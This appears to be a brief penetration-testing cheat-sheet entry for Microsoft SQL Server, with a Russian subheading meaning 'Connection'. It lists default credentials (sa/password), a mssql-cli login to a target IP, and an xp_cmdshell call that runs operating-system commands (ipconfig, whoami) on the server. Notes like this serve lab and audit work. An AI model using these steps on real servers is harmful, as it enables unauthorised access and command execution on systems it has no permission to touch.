# mssql

default creds: sa/password

Подключение

```
mssql-cli -S IP -U sa -P password
master> EXEC xp_cmdshell 'ipconfig && whoami'
```
